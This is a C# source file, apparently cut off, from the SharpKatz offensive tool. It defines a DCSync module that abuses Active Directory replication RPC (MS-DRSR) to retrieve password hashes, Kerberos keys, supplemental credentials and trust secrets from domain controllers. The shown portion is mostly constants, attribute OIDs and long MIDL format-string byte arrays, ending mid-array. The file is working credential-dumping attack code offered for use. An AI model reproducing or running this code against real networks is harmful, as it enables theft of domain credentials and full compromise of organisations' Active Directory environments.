//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

/*
 * Adapted by extending DCSync part of "MakeMeEnterpriseAdmin" 
 * (https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1)
 */

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using static SharpKatz.Module.Kerberos;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    public class DCSync
    {
        const int MD5_DIGEST_LENGTH = 16;

        const string PrimaryCleartext = "Primary:CLEARTEXT";
        const string PrimaryWDigest = "Primary:WDigest";
        const string PrimaryKerberos = "Primary:Kerberos";
        const string PrimaryKerberosNew = "Primary:Kerberos-Newer-Keys";
        const string PrimaryNtlmStrongNTOWF = "Primary:NTLM-Strong-NTOWF";
        const string Packages = "Packages";

        const int DRS_INIT_SYNC = 0x00000020;
        const int DRS_WRIT_REP = 0x00000010;
        const int DRS_NEVER_SYNCED = 0x00200000;
        const int DRS_FULL_SYNC_NOW = 0x00008000;
        const int DRS_SYNC_URGENT = 0x00080000;

        const int DRS_EXT_GETCHGREPLY_V6 = 0x04000000;
        const int DRS_EXT_STRONG_ENCRYPTION = 0x00008000;

        const int RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
        const int RPC_C_OPT_SECURITY_CALLBACK = 10;

        public const int RPC_C_AUTHN_WINNT = 10;
        public const int RPC_C_AUTHN_GSS_NEGOTIATE = 9;
        public const int RPC_C_AUTHN_GSS_KERBEROS = 16;
        public const int RPC_C_AUTHN_NONE = 0;

        const int SECPKG_ATTR_SESSION_KEY = 9;

        const string szOID_ANSI_name = "1.2.840.113556.1.4.1";
        const string szOID_objectGUID = "1.2.840.113556.1.4.2";

        const string szOID_ANSI_sAMAccountName = "1.2.840.113556.1.4.221";
        const string szOID_ANSI_userPrincipalName = "1.2.840.113556.1.4.656";
        const string szOID_ANSI_servicePrincipalName = "1.2.840.113556.1.4.771";
        const string szOID_ANSI_sAMAccountType = "1.2.840.113556.1.4.302";
        const string szOID_ANSI_userAccountControl = "1.2.840.113556.1.4.8";
        const string szOID_ANSI_accountExpires = "1.2.840.113556.1.4.159";
        const string szOID_ANSI_pwdLastSet = "1.2.840.113556.1.4.96";
        const string szOID_ANSI_objectSid = "1.2.840.113556.1.4.146";
        const string szOID_ANSI_sIDHistory = "1.2.840.113556.1.4.609";
        const string szOID_ANSI_unicodePwd = "1.2.840.113556.1.4.90";
        const string szOID_ANSI_ntPwdHistory = "1.2.840.113556.1.4.94";
        const string szOID_ANSI_dBCSPwd = "1.2.840.113556.1.4.55";
        const string szOID_ANSI_lmPwdHistory = "1.2.840.113556.1.4.160";
        const string szOID_ANSI_supplementalCredentials = "1.2.840.113556.1.4.125";

        const string szOID_ANSI_trustPartner = "1.2.840.113556.1.4.133";
        const string szOID_ANSI_trustAuthIncoming = "1.2.840.113556.1.4.129";
        const string szOID_ANSI_trustAuthOutgoing = "1.2.840.113556.1.4.135";

        const string szOID_ANSI_currentValue = "1.2.840.113556.1.4.27";

        const string szOID_isDeleted = "1.2.840.113556.1.2.48";

        static GCHandle procString;
        static GCHandle formatString;
        static GCHandle stub;
        static GCHandle faultoffsets;
        static GCHandle clientinterface;

        static byte[] ms2Ddrsr__MIDL_ProcFormatString = new byte[] {
                0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x44, 0x00, 0x40, 0x00, 0x47, 0x05, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
                0x08, 0x00, 0x78, 0x03, 0x0b, 0x00, 0x10, 0x00, 0x7c, 0x03, 0x13, 0x20, 0x18, 0x00, 0xa4, 0x03, 0x10, 0x01, 0x20, 0x00, 0xac, 0x03, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00,
                0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x30, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x40, 0x00, 0x44, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00,
                0xb4, 0x03, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x30, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x24, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00,
                0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00, 0xc0, 0x03, 0x50, 0x21, 0x18, 0x00, 0x08, 0x00, 0x13, 0x01,
                0x20, 0x00, 0x74, 0x04, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x08, 0x00, 0x46, 0x04,
                0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x8e, 0x04, 0x70, 0x00, 0x18, 0x00,
                0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00, 0xc2, 0x04, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00,
                0x06, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03,
                0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x05, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x30, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00,
                0x2c, 0x00, 0x24, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00,
                0x34, 0x05, 0x50, 0x21, 0x18, 0x00, 0x08, 0x00, 0x13, 0x81, 0x20, 0x00, 0x8a, 0x05, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x08, 0x00, 0x32, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x30, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00,
                0x24, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00, 0xdc, 0x05,
                0x50, 0x21, 0x18, 0x00, 0x08, 0x00, 0x13, 0x21, 0x20, 0x00, 0x2e, 0x06, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x30, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x24, 0x00,
                0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x48, 0x06, 0x50, 0x21,
                0x18, 0x00, 0x08, 0x00, 0x13, 0x41, 0x20, 0x00, 0x72, 0x06, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x30, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00,
                0x2c, 0x00, 0x24, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x10, 0x00,
                0x8c, 0x06, 0x50, 0x21, 0x18, 0x00, 0x08, 0x00, 0x13, 0xa1, 0x20, 0x00, 0xc6, 0x06, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00
            };

        static byte[] ms2Ddrsr__MIDL_TypeFormatString = new byte[] {
                0x00, 0x00, 0x1d, 0x00, 0x08, 0x00, 0x01, 0x5b, 0x15, 0x03, 0x10, 0x00, 0x08, 0x06, 0x06, 0x4c, 0x00, 0xf1, 0xff, 0x5b, 0x15, 0x07, 0x18, 0x00, 0x0b, 0x0b, 0x0b, 0x5b, 0xb7, 0x08, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00,
                0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xe2, 0xff, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x40, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b,
                0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xde, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00,
                0x9c, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x1d, 0x00, 0x1c, 0x00, 0x02, 0x5b, 0x15, 0x00, 0x1c, 0x00, 0x4c, 0x00,
                0xf4, 0xff, 0x5c, 0x5b, 0x1b, 0x01, 0x02, 0x00, 0x09, 0x57, 0xfc, 0xff, 0x01, 0x00, 0x05, 0x5b, 0x17, 0x03, 0x38, 0x00, 0xf0, 0xff, 0x08, 0x08, 0x4c, 0x00, 0x4e, 0xff, 0x4c, 0x00, 0xdc, 0xff,
                0x08, 0x5b, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x15, 0x07, 0x20, 0x00, 0x4c, 0x00, 0x36, 0xff, 0x0b, 0x0b, 0x5c, 0x5b, 0x1b, 0x07, 0x20, 0x00, 0x09, 0x00, 0xf8, 0xff,
                0x01, 0x00, 0x4c, 0x00, 0xe8, 0xff, 0x5c, 0x5b, 0x1a, 0x07, 0x10, 0x00, 0xec, 0xff, 0x00, 0x00, 0x08, 0x08, 0x4c, 0x00, 0xce, 0xff, 0x08, 0x5b, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x10, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x01, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00,
                0xec, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x08, 0xff, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xda, 0xff, 0x5c, 0x5b,
                0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xb8, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x40, 0x4c, 0x00,
                0xe0, 0xff, 0x5c, 0x5b, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xde, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00,
                0x0a, 0x00, 0x4c, 0x00, 0x74, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x36, 0x08, 0x40, 0x4c, 0x00, 0xdf, 0xff, 0x5b, 0x12, 0x00,
                0x10, 0xff, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x15, 0x07, 0x28, 0x00, 0x08, 0x40, 0x0b, 0x4c, 0x00, 0x53, 0xfe, 0x0b, 0x5c, 0x5b, 0x1b, 0x07, 0x28, 0x00, 0x09, 0x00,
                0xf8, 0xff, 0x01, 0x00, 0x4c, 0x00, 0xe6, 0xff, 0x5c, 0x5b, 0x1a, 0x07, 0x08, 0x00, 0xec, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xce, 0xff, 0x40, 0x5b, 0x1a, 0x03, 0x40, 0x00, 0x00, 0x00, 0x0c, 0x00,
                0x36, 0x4c, 0x00, 0xab, 0xff, 0x08, 0x40, 0x36, 0x36, 0x5b, 0x12, 0x00, 0xec, 0xff, 0x12, 0x00, 0x18, 0xfe, 0x12, 0x00, 0xd6, 0xff, 0x15, 0x07, 0x30, 0x00, 0x0b, 0x4c, 0x00, 0xaf, 0xff, 0x5b,
                0x1a, 0x07, 0x58, 0x00, 0x00, 0x00, 0x10, 0x00, 0x36, 0x08, 0x40, 0x4c, 0x00, 0x09, 0xff, 0x08, 0x40, 0x4c, 0x00, 0xe3, 0xff, 0x5b, 0x12, 0x00, 0x98, 0xfe, 0x21, 0x07, 0x00, 0x00, 0x19, 0x00,
                0x94, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xd4, 0xff, 0x5c, 0x5b, 0x1a, 0x07, 0xa8, 0x00, 0x00, 0x00, 0x28, 0x00, 0x4c, 0x00, 0xce, 0xfd, 0x4c, 0x00, 0xca, 0xfd,
                0x36, 0x4c, 0x00, 0xd1, 0xfd, 0x4c, 0x00, 0xcd, 0xfd, 0x36, 0x4c, 0x00, 0x2a, 0xfe, 0x08, 0x08, 0x08, 0x40, 0x36, 0x08, 0x08, 0x08, 0x4c, 0x00, 0x32, 0xfe, 0x36, 0x08, 0x40, 0x5b, 0x12, 0x00,
                0x50, 0xfe, 0x12, 0x00, 0x84, 0xfe, 0x12, 0x00, 0x70, 0xff, 0x12, 0x00, 0xae, 0xff, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c,
                0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xd8, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00,
                0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x36, 0x5b, 0x12, 0x00, 0xe4, 0xff, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x10, 0x27,
                0x00, 0x00, 0x1a, 0x03, 0x88, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x08, 0x08, 0x08, 0x4c, 0x00, 0x32, 0xfd, 0x4c, 0x00, 0x2e, 0xfd, 0x4c, 0x00, 0x2a, 0xfd,
                0x4c, 0x00, 0x26, 0xfd, 0x40, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08,
                0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xae, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00,
                0x4c, 0x00, 0x96, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00, 0x15, 0x03, 0x2c, 0x00, 0x4c, 0x00, 0xcc, 0xfc, 0x4c, 0x00,
                0x5a, 0xfd, 0x5c, 0x5b, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x1c, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x28, 0x00, 0x00, 0x00,
                0x10, 0x00, 0x36, 0x08, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x4c, 0x00, 0xc1, 0xff, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x3e, 0xfd, 0x12, 0x00, 0xce, 0xff, 0x12, 0x00, 0x8e, 0xfc, 0x12, 0x00, 0x18, 0x00,
                0xb7, 0x08, 0x01, 0x00, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x09, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x04, 0x00, 0xf0, 0xff, 0x00, 0x00, 0x4c, 0x00,
                0xe0, 0xff, 0x5c, 0x5b, 0x11, 0x14, 0xd6, 0xff, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xe1, 0x00, 0x00, 0x30, 0x41, 0x00, 0x00, 0x11, 0x00, 0x02, 0x00,
                0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x80, 0x00, 0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x64, 0x00, 0xff, 0xff, 0x15, 0x07, 0x08, 0x00, 0x0b, 0x5b, 0xb7, 0x08, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x15, 0x07, 0x18, 0x00, 0x4c, 0x00, 0x1c, 0xfc, 0x0b, 0x5b, 0x1b, 0x07, 0x18, 0x00, 0x09, 0x00, 0xf8, 0xff, 0x01, 0x00, 0x4c, 0x00, 0xea, 0xff, 0x5c, 0x5b,
                0x1a, 0x07, 0x10, 0x00, 0xec, 0xff, 0x00, 0x00, 0x08, 0x08, 0x4c, 0x00, 0xd0, 0xff, 0x08, 0x5b, 0xb7, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x1b, 0x03, 0x04, 0x00, 0x09, 0x00,
                0xfc, 0xff, 0x01, 0x00, 0x08, 0x5b, 0x1a, 0x03, 0x0c, 0x00, 0xf0, 0xff, 0x00, 0x00, 0x08, 0x08, 0x4c, 0x00, 0xde, 0xff, 0x5c, 0x5b, 0x1a, 0x07, 0x80, 0x00, 0x00, 0x00, 0x20, 0x00, 0x4c, 0x00,
                0xc8, 0xfb, 0x4c, 0x00, 0xc4, 0xfb, 0x36, 0x4c, 0x00, 0xcb, 0xfb, 0x36, 0x08, 0x08, 0x08, 0x08, 0x4c, 0x00, 0x84, 0xff, 0x36, 0x36, 0x4c, 0x00, 0x1e, 0xfc, 0x5c, 0x5b, 0x11, 0x00, 0x52, 0xfc,
                0x12, 0x00, 0x9e, 0xff, 0x12, 0x00, 0xc0, 0xff, 0x12, 0x00, 0xbc, 0xff, 0x11, 0x0c, 0x08, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0xa8, 0x00,
                0x01, 0x00, 0x06, 0x00, 0x00, 0x00, 0xaa, 0xfd, 0xff, 0xff, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x28, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
                0x04, 0x00, 0xff, 0xff, 0x1a, 0x03, 0x28, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x36, 0x36, 0x4c, 0x00, 0x58, 0xfb, 0x08, 0x40, 0x5c, 0x5b, 0x11, 0x00, 0xf8, 0xfb, 0x11, 0x08, 0x22, 0x5c, 0x11, 0x00,
                0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x68, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x14, 0x00, 0xff, 0xff, 0x1d, 0x00, 0x54, 0x00, 0x02, 0x5b, 0x15, 0x00,
                0x54, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x68, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x36, 0x36, 0x4c, 0x00, 0xea, 0xff, 0x08, 0x5b, 0x11, 0x00, 0xb6, 0xfb, 0x11, 0x08, 0x22, 0x5c,
                0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x18, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0xff, 0xff, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00,
                0x08, 0x00, 0x36, 0x36, 0x08, 0x40, 0x5c, 0x5b, 0x11, 0x00, 0x86, 0xfb, 0x12, 0x08, 0x22, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x30, 0x00,
                0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x24, 0x00, 0xff, 0xff, 0xb7, 0x08, 0x01, 0x00, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x04, 0x00, 0x01, 0x00, 0xff, 0xff,
                0xff, 0xff, 0x00, 0x00, 0x12, 0x00, 0x4a, 0xfb, 0x5c, 0x5b, 0x1a, 0x03, 0x30, 0x00, 0x00, 0x00, 0x12, 0x00, 0x08, 0x4c, 0x00, 0xd5, 0xff, 0x36, 0x4c, 0x00, 0x00, 0xfc, 0x4c, 0x00, 0xf8, 0xfa,
                0x5c, 0x5b, 0x12, 0x00, 0xd0, 0xff, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0x20, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x24, 0x00, 0xff, 0xff,
                0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x04, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xd2, 0xfb, 0x5c, 0x5b,
                0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x08, 0x4c, 0x00, 0xd5, 0xff, 0x36, 0x4c, 0x00, 0xa6, 0xfa, 0x5c, 0x5b, 0x12, 0x00, 0xd4, 0xff, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00,
                0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x20, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x24, 0x00, 0xff, 0xff, 0xb7, 0x08, 0x01, 0x00, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00, 0x21, 0x03, 0x00, 0x00,
                0x19, 0x00, 0x14, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x5c, 0x5b, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x08, 0x08, 0x08, 0x08, 0x08, 0x4c,
                0x00, 0xd1, 0xff, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd4, 0xff, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0x08, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
                0x6a, 0xfc, 0xff, 0xff, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x10, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0xff, 0xff, 0x1a, 0x03,
                0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x36, 0x08, 0x40, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0x10, 0x00, 0x01, 0x00,
